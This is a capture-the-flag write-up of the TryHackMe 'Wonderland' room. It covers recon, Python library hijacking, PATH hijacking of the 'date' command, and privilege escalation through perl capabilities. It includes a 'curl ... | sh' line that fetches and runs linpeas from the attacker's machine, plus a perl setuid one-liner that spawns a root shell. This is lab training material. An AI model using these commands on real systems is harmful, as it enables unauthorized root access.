# TryHackMe - Wonderland

https://tryhackme.com/room/wonderland

Topics covered in this room:
- Python module manipulation
- PATH variable environment
- Capabilities

### Recon and Enumeration

```bash
nmap -sC -sV 10.10.243.9 # Change this to IP given
```

![nmap-scan](img/nmap-scan.png)

We found port `80`, let's run `gobuster` to enumerate directory in the website
```bash
gobuster dir -w /opt/common.txt -u 10.10.243.9 
# Change this to IP given
# your wordlist may be different
```
While gobuster is scanning, let's open the browser to see what the website has
  
![web-manual-hunt-1](img/web-manual-hunt-1.png)


Nothing, let's see the source page. Hit `Ctrl+U` if you are using Firefox

![\web-manual-hunt-1-source-code](img/web-manual-hunt-1-source-code.png)

Same. Let's see if our gobuster found something

![gobuster-scan.png](img/gobuster-scan.png)

`/r`, interesting. Let's see what in there. Type `IP_OF_MACHINE/r`
 
![web-manual-hunt-2.png](img/web-manual-hunt-2.png)

Hmm, maybe we should follow *rabbit*? Lets try access all directory with spelling rabbit. The syntax should be
1. `IP_OF_MACHINE/r`
2. `IP_OF_MACHINE/r/a`
3. `IP_OF_MACHINE/r/a/b`
4. `IP_OF_MACHINE/r/a/b/b`
5. `IP_OF_MACHINE/r/a/b/b/i`
6. `IP_OF_MACHINE/r/a/b/b/i`
7. `IP_OF_MACHINE/r/a/b/b/i/t`

![web-manual-hunt-end.png](img/web-manual-hunt-end.png)


Have we got ourselves into the *rabbit hole*? Lets we check the source code of the page. Hit `Ctrl+U` if you are using firefox
![web-manual-hunt-end-source-page.png](img/web-manual-hunt-end-source-page.png) 

We know from Nmap scan, we have port `22` open which we can SSH into the machine. And we found something that was hidden that may have been credential. Lets SSH into the machine with this info
```bash
ssh alice@IP
```
![ssh-alice.png](img/ssh-alice.png) 

***WE ARE IN***

### Alice

Let's see what `alice` has

![alice-directory.png](img/alice-directory.png) 

We have 2 interesting files called `root.txt` and a python file. Both can only be run as `root`.

Lets see what `sudo` command our `alice` can run
![alice-sudo.png](img/alice-sudo.png) 

So, `alice` can run the python command only as a username `rabbit`. Let's run it
![alice-py.png](img/alice-py.png) 

We got a poem, let's see what is this python script does. Use `nano walrus_and_the_carpenter.py`
![alice-py-sc-1.png](img/alice-py-sc-1.png) 

![alice-py-sc-2.png](img/alice-py-sc-2.png) 

So, the scripts run a `for` loop where it will randomly split the poem and print it 10 times using the `random` library.

If we check python library path configuration using `python3 -c 'import sys; print(sys.path)'` we will see that the very first thing python will check is the current directory where the script is run(mark by `['',` )
  
![alice-py-lib-src.png](img/alice-py-lib-src.png) 

What that means is, we can create a new python file named `random.py` containing some exploit code where `walrus_and_the_carpenter.py` will use it as the library, since the current directory is the very first the script will check. More in [here](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7)

Make a new file call `random.py` with `nano` or `vim` and type code bellow

![random-py-exploit.png](img/random-py-exploit.png) 

Now if we run the `sudo rabbit` command earlier, we will now switch to user `rabbit`

![rabbit-shell.png](img/rabbit-shell.png) 

### Rabbit

Neat, let's see what we have in the `rabbit` directory.

![rabbit-directory.png](img/rabbit-directory.png)
 
Running `file teaParty` will tell us what is this file. It is a binary file. Running it with `./teaParty` won't tell us much info

![teaParty](img/teaParty.png)

Usually, with a binary file, we can use `strings` to see what piece of string is in the file. But since there are no `strings` in our machine we will use `less`. Run `less teaParty`. You will get a bunch of text that very confusing, its because we try to open the binary file as a text. But there are strings that readable, that what we wanted. Scroll down long enough you will find strings that look similar when we run `./teaParty`

![teaParty-string](img/teaParty-string.png)

What this binary will do if it runs, it will display text `Welcome to the tea party! The Mad Hatter will be here soon.` and then the date that is `echo` from the variable `date` in the system (in our case it's our machine). Hence why when we run the file, we get an estimated time of +1 hour from our machine. 

If you look closely there are 2 variables that this binary use. `echo` and `date`. `echo` is set to run using PATH from `bin/echo`, but there is no rule for where this `date` variable should run from. We can create our own `date.sh` containing our payload as the PATH preference for binary to run. So let's do this!

> More on explained of PATH is [here](https://linuxconfig.org/linux-path-environment-variable) and for [this exploit](https://betterprogramming.pub/becoming-root-via-a-misconfigured-path-720a52981c93) it self

Make a new path on `/tmp` with command `export PATH=/tmp:$PATH` and confirm it with `echo $PATH`. If done correctly we can see that `/tmp` is in front.

> Why on `/tmp` you may ask? Most of the directories that own by `root` can only be access as `root` itself for some exceptions which `/tmp` is one of them, google this for more info.

Create a new shell script called `date` with `vim` or `nano` with the code below

![date-exploit](img/date-exploit.png)

Change the mode of our `date` as executable with `chmod +x /tmp/date` and run the binary again with `./teaParty`

![hatter-shell](img/hatter-shell.png)

There is a few explanations for this exploit, which I will try to explain the best as I can:

1. You may be wondering, why we create our `date` on `/tmp` as suppose to in the current directory? It because `teaParty` is it's own and can only be edited by `root` which you can check with running command `ls -la`. Since we need to modify the `date` whom our `teaParty` use, hence we need to place it as in `root` only area, and `/tmp` is one of the places that own by `root` whose also can be accessed by any user. If you try to use it in the current directory, it won't work.

2. What the code in `date` does is simply spawn `bash` as suppose to complete the script. If we run `teaParty` normally, there is an `ending` in which the script is complete its job. Where after this exploit, instead of giving you and time estimation in the line after `Probably by` it spawn a `bash` shell.

So now we have `hatter` shell, we will go to `hatter` home directory. 

![hatter-pass](img/hatter-pass.png)

Go ahead to `cat` the password and let's switch to `hatter` user, since we technically are not fully `hatter`

![su-hatter](img/su-hatter.png)

### Hatter

All we have is just `password.txt`, and nothing else. What we do now? Well let's use the enumeration tool, [`linpeas`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Download the file and put it on your machine. Start web simple httpserver by `python3 -m http.server 80` on where `linpeas.sh` is located. Open a new terminal and type in `ifconfig` and save/write `tun0` IP somewhere

On target machine, type in `curl tun0_IP/linpeas.sh | sh | tee linlog.txt`. What this command does is it will download `linpeas.sh` in our machine and run it as well as save it as `linlog.txt`

As you notice, it slows to navigating the target machine. And there is a lot of information that `linlog.txt` has so we want to copy `linlog.txt` from the target machine to our machine. Use `scp hatter@10.10.243.9:/home/hatter/linlog.txt .` and once completed, open it on your machine with `less -r linlog.txt` and press `y`

This part requires you to have some knowledge of linux privilege escalation vector. Usually, if this is a beginner room, you will see right away the vector by finding **orange** color.

Running `sudo -l` confirming that `hatter` don't have access to `sudo`. Right now, the best we can do is to check anything that `linpeas` has a mark with **red** color. One way to check is to use [GTFOBins](https://gtfobins.github.io/) as well as read the link that `linpeas.sh` gave.

To make it short we will use what's in `capabilities`. Quoting from book.hacktricks.xyz itself
> Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

In short: `capabilities` is a way to make an exception for the nonprivileged user to run an important task like most networking stuff which `root` is the one who capable as `root` is a privileged user. There is a lot of vectors we can use, but `linpeas` told us we can use `cap_setuid` of `perl`. Read more [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#capabilities).

![capabilites](img/capabilities.png)

Type in `which perl` to find where is the perl executable is located, and head over to [GTFOBins](https://gtfobins.github.io/) and find `Perl` section

On the very bottom, we see `Capabilities` section. We only need some of the code, so use command `/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`.

![perl-to-bash](img/perl-to-bash.png)
> NOTE: `/bin/sh` is change to `/bin/bash` because we want `bash` to spawn, not `sh`

And now you are `root`. Since you are root, you can go to `alice` directory to get `root.txt` and go to `/root` directory to get `user.txt`
